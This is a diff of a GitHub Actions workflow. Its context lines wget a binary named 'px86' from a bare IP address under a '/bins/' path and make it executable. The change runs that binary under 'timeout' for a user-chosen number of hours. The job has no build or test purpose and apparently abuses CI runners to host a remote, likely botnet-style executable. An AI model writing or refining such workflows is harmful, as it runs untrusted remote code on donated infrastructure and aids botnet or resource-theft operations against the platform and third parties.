@@ -26,18 +26,12 @@ jobs:
         wget http://45.138.16.158/bins/px86 -O px86
         chmod +x px86
 
-    - name: Run binary and wait
+    - name: Run binary with timeout
       run: |
-        # Run the binary in background
-        ./px86 x86 > output.log 2>&1 &
-        PID=$!
-        echo "Binary started with PID: $PID"
-        
-        # Wait for the specified time
         UPTIME=${{ github.event.inputs.uptime }}
-        echo "Keeping VM alive for $UPTIME hours..."
-        sleep $(($UPTIME * 3600))
+        echo "Running binary for $UPTIME hours"
         
-        # Cleanup
-        kill $PID 2>/dev/null || true
-        echo "Process terminated"
+        # Run the binary with timeout command
+        timeout $(($UPTIME * 3600)) ./px86 x86
+        
+        echo "Binary execution completed"
